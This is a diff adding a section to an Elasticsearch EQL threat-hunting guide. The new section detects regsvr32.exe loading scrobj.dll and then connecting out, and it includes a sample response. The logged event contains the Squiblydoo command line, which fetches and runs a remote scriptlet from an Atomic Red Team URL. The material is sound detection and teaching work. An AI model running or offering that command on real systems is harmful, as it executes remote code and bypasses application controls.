@@ -192,3 +192,139 @@ GET /my-data-stream/_eql/search
 
 </details>
 
+#### Determine the likelihood of success
+
+heck for the following series of events:
+
+1. A regsvr32.exe process
+2. A load of the scrobj.dll library by the same process
+3. Any network event by the same process
+
+```json
+
+GET /my-data-stream/_eql/search
+{
+  "query": """
+    sequence by process.pid
+      [process where process.name == "regsvr32.exe" ]
+      [library where dll.name == "scrobj.dll"]
+      [network where true]
+  """
+}
+
+```
+
+<details>
+  <summary>Response:</summary>
+
+```json
+
+{
+  "is_partial" : false,
+  "is_running" : false,
+  "took" : 34,
+  "timed_out" : false,
+  "hits" : {
+    "total" : {
+      "value" : 1,
+      "relation" : "eq"
+    },
+    "sequences" : [
+      {
+        "join_keys" : [
+          2012
+        ],
+        "events" : [
+          {
+            "_index" : ".ds-my-data-stream-2023.04.28-000001",
+            "_id" : "9v9YxocBJz9yVPk--OPB",
+            "_source" : {
+              "process" : {
+                "parent" : {
+                  "name" : "cmd.exe",
+                  "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
+                  "executable" : """C:\Windows\System32\cmd.exe"""
+                },
+                "name" : "regsvr32.exe",
+                "pid" : 2012,
+                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+                "command_line" : "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+                "executable" : """C:\Windows\System32\regsvr32.exe""",
+                "ppid" : 2652
+              },
+              "logon_id" : 217055,
+              "@timestamp" : 131883573237130000,
+              "event" : {
+                "category" : "process",
+                "type" : "creation"
+              },
+              "user" : {
+                "full_name" : "bob",
+                "domain" : "ART-DESKTOP",
+                "id" : """ART-DESKTOP\bob"""
+              }
+            }
+          },
+          {
+            "_index" : ".ds-my-data-stream-2023.04.28-000001",
+            "_id" : "Fv9YxocBJz9yVPk--OTC",
+            "_source" : {
+              "process" : {
+                "name" : "regsvr32.exe",
+                "pid" : 2012,
+                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+                "executable" : """C:\Windows\System32\regsvr32.exe"""
+              },
+              "dll" : {
+                "path" : """C:\Windows\System32\scrobj.dll""",
+                "name" : "scrobj.dll"
+              },
+              "@timestamp" : 131883573237450016,
+              "event" : {
+                "category" : "library"
+              }
+            }
+          },
+          {
+            "_index" : ".ds-my-data-stream-2023.04.28-000001",
+            "_id" : "hP9YxocBJz9yVPk--OTC",
+            "_source" : {
+              "process" : {
+                "name" : "regsvr32.exe",
+                "pid" : 2012,
+                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+                "executable" : """C:\Windows\System32\regsvr32.exe"""
+              },
+              "destination" : {
+                "address" : "151.101.48.133",
+                "port" : "443"
+              },
+              "source" : {
+                "address" : "192.168.162.134",
+                "port" : "50505"
+              },
+              "network" : {
+                "direction" : "outbound",
+                "protocol" : "tcp"
+              },
+              "@timestamp" : 131883573238680000,
+              "event" : {
+                "category" : "network"
+              },
+              "user" : {
+                "full_name" : "bob",
+                "domain" : "ART-DESKTOP",
+                "id" : """ART-DESKTOP\bob"""
+              }
+            }
+          }
+        ]
+      }
+    ]
+  }
+}
+
+```
+
+</details>
+
